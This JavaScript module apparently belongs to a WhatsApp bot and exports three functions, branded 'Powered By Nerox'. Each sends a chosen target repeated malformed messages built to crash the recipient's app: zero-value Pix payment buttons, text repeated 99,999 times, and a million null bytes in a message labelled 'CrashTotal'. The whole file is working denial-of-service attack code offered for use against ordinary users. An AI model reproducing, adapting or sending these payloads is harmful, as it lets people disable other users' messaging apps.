exports.neroxex = async (neroxz, target, messageData) => {
    for (let i = 0; i < 7; i++) {
        await neroxz.relayMessage(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadataVersion: 0x2,
                            deviceListMetadata: {}
                        },
                        interactiveMessage: {
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "payment_info",
                                        buttonParamsJson: JSON.stringify({
                                            currency: "BRL",
                                            total_amount: { value: 0, offset: 100 },
                                            reference_id: "4P46GMY57GC",
                                            type: "physical-goods",
                                            order: {
                                                status: "pending",
                                                subtotal: { value: 0, offset: 100 },
                                                order_type: "ORDER",
                                                items: [
                                                    {
                                                        name: "",
                                                        amount: { value: 0, offset: 100 },
                                                        quantity: 0,
                                                        sale_amount: { value: 0, offset: 100 }
                                                    }
                                                ]
                                            },
                                            payment_settings: [
                                                {
                                                    type: "pix_static_code",
                                                    pix_static_code: {
                                                        merchant_name: "meu ovo",
                                                        key: "+6283896252486",
                                                        key_type: "X"
                                                    }
                                                }
                                            ]
                                        })
                                    }
                                ]
                            }
                        }
                    }
                }
            },
            { participant: { jid: target } },
            { messageId: null }
        );
    }
};

const messageData = {
    key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
    },
    message: {
        interactiveResponseMessage: {
            body: {
                text: "Sent",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: JSON.stringify({
                    screen_2_OptIn_0: true,
                    screen_2_OptIn_1: true,
                    screen_1_Dropdown_0: "ModsExecute",
                    screen_1_DatePicker_1: "1028995200000",
                    screen_1_TextInput_2: "czazxvoid@Akmal.id",
                    screen_1_TextInput_3: "94643116",
                    screen_0_TextInput_0: "radio - buttons" + "".repeat(500000),
                    screen_0_TextInput_1: "*🚷▸⃟°̯͜𝚫̸𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐍𝐞𝐫𝐨𝐱⭑ ༑ ⃟̶̽♨️*",
                    screen_0_Dropdown_2: "001-Grimgar",
                    screen_0_RadioButtonsGroup_3: "0_true",
                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }),
                version: 3
            }
        }
    }
};

exports.kiraex = async (neroxz, target) => {
    for (let i = 0; i < 7; i++) {
        const messageContent = await generateWAMessageFromContent(
            target,
            proto.Message.fromObject({
                extendedTextMessage: {
                    text: '*🚷▸⃟°̯͜𝚫̸𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐍𝐞𝐫𝐨𝐱⭑ ༑ ⃟̶̽'.repeat(99999),
                    contextInfo: {
                        stanzaId: target,
                        participant: target,
                        quotedMessage: {
                            conversation: "؂ن؃؄ټ".repeat(99999)
                        },
                        disappearingMode: {
                            initiator: "CHANGED_IN_CHAT",
                            trigger: "CHAT_SETTING"
                        }
                    },
                    inviteLinkGroupTypeV2: "DEFAULT",
                    nativeFlowMessage: {
                        buttons: [{
                            name: "call_permission_request",
                            buttonParamsJson: '{"key":"value"}'
                        }]
                    }
                }
            }),
            { userJid: target }
        );
        await neroxz.relayMessage(target, messageContent.message, {
            participant: { jid: target },
            messageId: messageContent.key.id
        });

        console.log(messageData);
    }
};

exports.kirafx = async (neroxz, jid) => {
    for (let jmlh = 3; jmlh > 0; jmlh--) {
        await neroxz.relayMessage(jid, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadataVersion: 0x2,
                        deviceListMetadata: {}
                    },
                    interactiveMessage: {
                        nativeFlowMessage: {
                            buttons: [{
                                name: "payment_info",
                                buttonParamsJson: JSON.stringify({
                                    currency: "BRL",
                                    total_amount: { value: 0, offset: 100 },
                                    reference_id: "4P46GMY57GC",
                                    type: "physical-goods",
                                    order: {
                                        status: "pending",
                                        subtotal: { value: 0, offset: 100 },
                                        order_type: "ORDER",
                                        items: [
                                            {
                                                name: "",
                                                amount: { value: 0, offset: 100 },
                                                quantity: 0,
                                                sale_amount: { value: 0, offset: 100 }
                                            }
                                        ]
                                    },
                                    payment_settings: [
                                        {
                                            type: "pix_static_code",
                                            pix_static_code: {
                                                merchant_name: "*🚷▸⃟°̯͜𝚫̸𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐍𝐞𝐫𝐨𝐱⭑ ༑ ⃟̶̽",
                                                key: "+6283896252486",
                                                key_type: "X"
                                            }
                                        }
                                    ]
                                })
                            }]
                        }
                    }
                }
            }
        }, {
            participant: { jid: jid }
        }, {
            messageId: null
        });
    }

    for (let jmlhh = 3; jmlhh > 0; jmlhh--) {
        await neroxz.relayMessage(jid, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: " "
                        },
                        body: {
                            text: "CrashTotal"
                        },
                        footer: {
                            text: 'xp'
                        },
                        nativeFlowMessage: {
                            buttons: [{
                                name: 'cta_url',
                                buttonParamsJson: "{ display_text : '*🚷▸⃟°̯͜𝚫̸𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐍𝐞𝐫𝐨𝐱⭑ ༑ ⃟̶̽', url : '', merchant_url : '' }"
                            }],
                            messageParamsJson: "\0".repeat(1000000)
                        }
                    }
                }
            }
        }, {
            participant: { jid: jid }
        });
    }
};